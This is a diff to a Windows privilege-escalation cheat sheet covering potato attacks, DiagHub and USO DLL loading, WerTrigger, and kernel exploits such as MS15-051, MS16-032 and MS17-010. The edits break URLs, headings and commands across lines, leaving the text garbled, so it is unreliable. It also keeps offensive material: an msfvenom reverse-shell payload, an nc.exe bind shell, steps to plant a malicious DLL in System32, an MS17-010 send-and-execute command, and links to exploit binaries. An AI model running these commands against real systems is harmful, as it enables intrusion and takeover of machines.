@@ -1184,7 +1184,9 @@ RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8
 
 ### EFSPotato (MS-EFSR EfsRpcOpenFileRaw)
 
-* Binary available at https://github.com/zcgonvh/EfsPotato
+* Binary available at 
+https://github.com/
+zcgonvh/EfsPotato
 
 ```powershell
 # .NET 4.x
@@ -1209,14 +1211,20 @@ This DCOM object can be used to load a DLL into a SYSTEM process, provided that 
 #### Exploit
 
 1. Create an [evil DLL](https://gist.github.com/xct/3949f3f4f178b1f3427fae7686a2a9c0) e.g: payload.dll and move it into `C:\Windows\System32`
-2. Build https://github.com/xct/diaghub
+2. Build 
+https://github.com/xct/diaghub
 3. `diaghub.exe c:\\ProgramData\\ payload.dll`
 
 The default payload will run `C:\Windows\System32\spool\drivers\color\nc.exe -lvp 2000 -e cmd.exe`
 
 Alternative tools:
-* https://github.com/Accenture/AARO-Bugs/tree/master/CVE-2020-5825/TrigDiag
-* https://github.com/decoder-it/diaghub_exploit
+* 
+https://github.com/
+Accenture/AARO-Bugs/tree/master/
+CVE-2020-5825
+/TrigDiag
+* 
+https://github.com/decoder-it/diaghub_exploit
 
 
 ### UsoDLLLoader
@@ -1229,7 +1237,9 @@ If we found a privileged file write vulnerability in Windows or in some third-pa
 
 #### Exploit
 
-1. Build https://github.com/itm4n/UsoDllLoader
+1. Build 
+https://github.com/
+itm4n/UsoDllLoader
     * Select Release config and x64 architecure.
     * Build solution.
         * DLL .\x64\Release\WindowsCoreDeviceInfo.dll
@@ -1242,7 +1252,9 @@ If we found a privileged file write vulnerability in Windows or in some third-pa
 
 > Weaponizing for privileged file writes bugs with Windows problem reporting
 
-1. Clone https://github.com/sailay1996/WerTrigger
+1. Clone 
+https://github.com/
+sailay1996/WerTrigger
 2. Copy `phoneinfo.dll` to `C:\Windows\System32\`
 3. Place `Report.wer` file and `WerTrigger.exe` in a same directory.
 4. Then, run `WerTrigger.exe`.
@@ -1295,7 +1307,9 @@ Metasploit : exploit/windows/local/ms10_015_kitrap0d
 ### MS11-080 (afd.sys) - Microsoft Windows XP/2003
 
 ```powershell
-Python: https://www.exploit-db.com/exploits/18176
+Python: https://
+www.exploit-db.com
+/exploits/18176
 Metasploit: exploit/windows/local/ms11_080_afdjoinleaf
 ```
 
@@ -1306,12 +1320,18 @@ printf("[#] usage: ms15-051 command \n");
 printf("[#] eg: ms15-051 \"whoami /all\" \n");
 
 # x32
-https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/Win32/ms15-051.exe
+https://
+github.com
+/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/Win32/ms15-051.exe
 
 # x64
-https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/x64/ms15-051.exe
+https://
+github.com
+/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/x64/ms15-051.exe
 
-https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
+https://
+github.com
+/SecWiki/windows-kernel-exploits/tree/master/MS15-051
 use exploit/windows/local/ms15_051_client_copy_image
 ```
 
@@ -1322,10 +1342,16 @@ Check if the patch is installed : `wmic qfe list | findstr "3139914"`
 
 ```powershell
 Powershell:
-https://www.exploit-db.com/exploits/39719/
-https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1
+https://
+www.exploit-db.com
+/exploits/39719/
+https://
+github.com
+/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1
 
-Binary exe : https://github.com/Meatballs1/ms16-032
+Binary exe : https://
+github.com
+/Meatballs1/ms16-032
 
 Metasploit : exploit/windows/local/ms16_032_secondary_logon_handle_privesc
 ```
@@ -1351,16 +1377,23 @@ exploit/windows/smb/ms17_010_psexec           MS17-010 EternalRomance/EternalSyn
 If you can't use Metasploit and only want a reverse shell.
 
 ```powershell
-git clone https://github.com/helviojunior/MS17-010
+git clone https://
+github.com
+/helviojunior/MS17-010
 
 # generate a simple reverse shell to use
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe
-python2 send_and_execute.py 10.0.0.1 revshell.exe
+python2 send_and_
+execute.py
+ 10.0.0.1 revshell.exe
 ```
 
-### CVE-2019-1388
+### 
+CVE-2019-1388
 
-Exploit : https://packetstormsecurity.com/files/14437/hhupd.exe.html
+Exploit : https://
+packetstormsecurity.com
+/files/14437/hhupd.exe.html
 
 Requirement:
 - Windows 7 
@@ -1371,43 +1404,4 @@ Failing on :
 - 1709
 - 1803
 
-Detailed information about the vulnerability : https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege
 
-
-## References
-
-* [Windows Internals Book - 02/07/2017](https://docs.microsoft.com/en-us/sysinternals/learn/windows-internals)
-* [icacls - Docs Microsoft](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)
-* [Privilege Escalation Windows - Philip Linghammar](https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html)
-* [Windows elevation of privileges - Guifre Ruiz](https://guif.re/windowseop)
-* [The Open Source Windows Privilege Escalation Cheat Sheet by amAK.xyz and @xxByte](https://addaxsoft.com/wpecs/)
-* [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
-* [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
-* [TOP–10 ways to boost your privileges in Windows systems - hackmag](https://hackmag.com/security/elevating-privileges-to-administrative-and-further/)
-* [The SYSTEM Challenge](https://decoder.cloud/2017/02/21/the-system-challenge/)
-* [Windows Privilege Escalation Guide - absolomb's security blog](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
-* [Chapter 4 - Windows Post-Exploitation - 2 Nov 2017 - dostoevskylabs](https://github.com/dostoevskylabs/dostoevsky-pentest-notes/blob/master/chapter-4.md)
-* [Remediation for Microsoft Windows Unquoted Service Path Enumeration Vulnerability - September 18th, 2016 - Robert Russell](https://www.tecklyfe.com/remediation-microsoft-windows-unquoted-service-path-enumeration-vulnerability/)
-* [Pentestlab.blog - WPE-01 - Stored Credentials](https://pentestlab.blog/2017/04/19/stored-credentials/)
-* [Pentestlab.blog - WPE-02 - Windows Kernel](https://pentestlab.blog/2017/04/24/windows-kernel-exploits/)
-* [Pentestlab.blog - WPE-03 - DLL Injection](https://pentestlab.blog/2017/04/04/dll-injection/)
-* [Pentestlab.blog - WPE-04 - Weak Service Permissions](https://pentestlab.blog/2017/03/30/weak-service-permissions/)
-* [Pentestlab.blog - WPE-05 - DLL Hijacking](https://pentestlab.blog/2017/03/27/dll-hijacking/)
-* [Pentestlab.blog - WPE-06 - Hot Potato](https://pentestlab.blog/2017/04/13/hot-potato/)
-* [Pentestlab.blog - WPE-07 - Group Policy Preferences](https://pentestlab.blog/2017/03/20/group-policy-preferences/)
-* [Pentestlab.blog - WPE-08 - Unquoted Service Path](https://pentestlab.blog/2017/03/09/unquoted-service-path/)
-* [Pentestlab.blog - WPE-09 - Always Install Elevated](https://pentestlab.blog/2017/02/28/always-install-elevated/) 
-* [Pentestlab.blog - WPE-10 - Token Manipulation](https://pentestlab.blog/2017/04/03/token-manipulation/)
-* [Pentestlab.blog - WPE-11 - Secondary Logon Handle](https://pentestlab.blog/2017/04/07/secondary-logon-handle/)
-* [Pentestlab.blog - WPE-12 - Insecure Registry Permissions](https://pentestlab.blog/2017/03/31/insecure-registry-permissions/)
-* [Pentestlab.blog - WPE-13 - Intel SYSRET](https://pentestlab.blog/2017/06/14/intel-sysret/)
-* [Alternative methods of becoming SYSTEM - 20th November 2017 - Adam Chester @_xpn_](https://blog.xpnsec.com/becoming-system/)
-* [Living Off The Land Binaries and Scripts (and now also Libraries)](https://github.com/LOLBAS-Project/LOLBAS)
-* [Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec](https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html)
-* [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)
-* [Abusing Diaghub - xct - March 07, 2019](https://vulndev.io/howto/2019/03/07/diaghub.html)
-* [Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege - James Forshaw, Project Zero - Wednesday, April 18, 2018](https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html)
-* [Weaponizing Privileged File Writes with the USO Service - Part 2/2 - itm4n - August 19, 2019](https://itm4n.github.io/usodllloader-part2/)
-* [Hacking Trick: Environment Variable $Path Interception y Escaladas de Privilegios para Windows](https://www.elladodelmal.com/2020/03/hacking-trick-environment-variable-path.html?m=1)
-* [Abusing SeLoadDriverPrivilege for privilege escalation - 14 - JUN - 2018 - OSCAR MALLO](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
-* [Universal Privilege Escalation and Persistence – Printer - AUGUST 2, 2021)](https://pentestlab.blog/2021/08/02/universal-privilege-escalation-and-persistence-printer/)
